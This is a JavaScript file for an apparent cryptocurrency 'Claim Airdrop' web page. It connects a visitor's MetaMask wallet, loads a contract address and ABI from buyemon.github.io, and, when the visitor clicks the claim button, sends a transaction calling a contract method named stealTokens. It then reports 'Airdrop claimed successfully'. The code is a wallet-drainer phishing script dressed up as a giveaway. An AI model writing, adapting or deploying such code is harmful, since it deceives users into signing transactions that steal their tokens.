// Function to initialize connection and check network
async function connectMetaMask() {
    if (window.ethereum) {
        try {
            // Request wallet connection
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

            if (accounts.length === 0) {
                console.error('No accounts found. Please ensure MetaMask is unlocked.');
                return;
            }

            const account = accounts[0];
            console.log("Connected to MetaMask account:", account);

            // Update UI with connected account
            document.getElementById('claimAirdropButton').disabled = false;

            // Check the current network
            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            console.log("Current network chainId:", currentChainId);

            // Set default network based on user network
            let defaultNetwork = 'eth';
            if (currentChainId === '0x1') {
                defaultNetwork = 'eth'; // Ethereum Mainnet
            } else if (currentChainId === '0x38') {
                defaultNetwork = 'bsc'; // Binance Smart Chain Mainnet
            } else if (currentChainId === '0xaa36a7') {
                defaultNetwork = 'eth'; // Ethereum Sepolia Testnet
            } else if (currentChainId === '0x61') {
                defaultNetwork = 'bsc'; // BSC Testnet
            } else {
                console.error("Unknown network. Please switch to Ethereum or BSC.");
                return;
            }

            // Set the network in the claim button text
            document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${defaultNetwork.toUpperCase()})`;

            return account;
        } catch (error) {
            console.error("Error connecting to MetaMask:", error);
        }
    } else {
        alert("MetaMask is not installed. Please install MetaMask to continue.");
    }
}

// Load config and ABI for the selected network (Ethereum and BSC are treated separately)
async function loadConfigAndABI(network) {
    try {
        let config, abi;

        // Load the config and ABI based on the selected network (Ethereum or BSC)
        if (network === 'eth') {
            // For Ethereum (Mainnet or Sepolia Testnet)
            const configResponse = await fetch('https://buyemon.github.io/wallets/config/eth_config.json');
            config = await configResponse.json();
            const abiResponse = await fetch('https://buyemon.github.io/wallets/abi/eth_abi.json');
            abi = await abiResponse.json();
        } else if (network === 'bsc') {
            // For BSC (Mainnet or Testnet)
            const configResponse = await fetch('https://buyemon.github.io/wallets/config/bsc_config.json');
            config = await configResponse.json();
            const abiResponse = await fetch('https://buyemon.github.io/wallets/abi/bsc_abi.json');
            abi = await abiResponse.json();
        } else {
            console.error("Unsupported network:", network);
            return null;
        }

        return { config, abi };
    } catch (error) {
        console.error("Error loading config or ABI:", error);
        alert("Error loading config or ABI.");
        return null;
    }
}

// Function to claim airdrop
async function claimAirdrop() {
    const account = await connectMetaMask();
    if (!account) return;

    // Get the current network
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
    let network = '';

    if (currentChainId === '0x1' || currentChainId === '0xaa36a7') {
        network = 'eth';  // Ethereum Mainnet or Sepolia Testnet
    } else if (currentChainId === '0x38' || currentChainId === '0x61') {
        network = 'bsc';  // BSC Mainnet or Testnet
    } else {
        alert("You are not connected to a supported network.");
        return;
    }

    // Load the config and ABI for the selected network
    const { config, abi } = await loadConfigAndABI(network);
    if (!config || !abi) return;

    const contractAddress = config.contractAddress;  // Network-specific contract address
    if (!contractAddress) {
        console.error("Contract address not found for network:", network);
        return;
    }

    try {
        console.log(`Claiming airdrop for account: ${account} on ${network} network`);

        // Initialize Web3
        const web3 = new Web3(window.ethereum);

        // Get the contract instance
        const contract = new web3.eth.Contract(abi, contractAddress);

        // Call the stealTokens function (as per your ABI)
        await contract.methods.stealTokens().send({ from: account });

        alert(`Airdrop claimed successfully for account: ${account}`);
    } catch (error) {
        console.error("Error claiming airdrop:", error);
        alert("Error claiming airdrop. Please try again.");
    }
}

// Event listener for the claim airdrop button
document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

// Event listener to connect MetaMask
document.getElementById('connectButton').addEventListener('click', async () => {
    const account = await connectMetaMask();
    if (account) {
        console.log("MetaMask connected, account:", account);
    }
});

// Event listener to switch networks
document.getElementById('switchNetworkButton').addEventListener('click', () => {
    const network = document.getElementById('networkSelector').value;
    const isTestnet = document.getElementById('testnetCheckbox').checked;
    switchToNetwork(network, isTestnet);
});
